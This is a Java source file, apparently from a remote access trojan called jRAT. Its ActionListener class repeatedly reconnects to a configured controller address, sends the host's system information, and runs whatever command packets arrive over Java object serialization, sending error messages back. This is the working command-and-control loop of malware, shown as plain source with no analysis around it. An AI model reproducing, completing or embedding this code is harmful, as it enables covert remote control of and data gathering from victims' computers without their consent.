package net.jrat.core.threads;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import net.jrat.core.Client;
import net.jrat.core.connection.SystemInformations;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C0PacketConnect;
import net.jrat.core.packet.client.C1PacketMessage;
import net.jrat.utils.Variables;

public class ActionListener implements Runnable
{
	private final Client client = Client.instance;
	
	@Override
	public void run()
	{
		while(this.client.running)
		{
			this.waitForConnection();

			try
			{
				final Object input = this.client.inputStream.readObject();
				
				new Thread(new Runnable()
				{
					@Override
					public void run()
					{
						try
						{
							if(input instanceof IPacket)
							{
								final IPacket packet = (IPacket) input;
								packet.execute(null);
							}
						}
						catch(Exception e)
						{
							try
							{
								Client.instance.outputStream.writeObject(new C1PacketMessage("could not execute command: " + e.getMessage()));
							}
							catch(Exception e0)
							{
								client.connected = false;
							}
						}
					}
				}, "command").start();
				
			}
			catch(Exception e)
			{
				this.client.connected = false;
				
				try
				{
					this.client.socket.close();
					this.client.inputStream.close();
					this.client.outputStream.close();
				}
				catch(Exception e0) {}
			}
		}
	}
	
	private void waitForConnection()
	{
		while((!(this.client.connected) || this.client.socket.isClosed()) && this.client.running)
		{
			try
			{
				this.client.socket = new Socket(Variables.instance.address, Variables.instance.port);
				this.client.socket.setKeepAlive(true);
				
				this.client.outputStream = new ObjectOutputStream(this.client.socket.getOutputStream());
				this.client.inputStream = new ObjectInputStream(this.client.socket.getInputStream());
				
				this.client.outputStream.writeObject(new C0PacketConnect(SystemInformations.instance));
				
				this.client.connected = true;
			}
			catch(Exception e)
			{
				this.client.connected = false;

				try
				{
					Thread.sleep(5000L);
				}
				catch(Exception e0) {}
			}
		}
	}
}
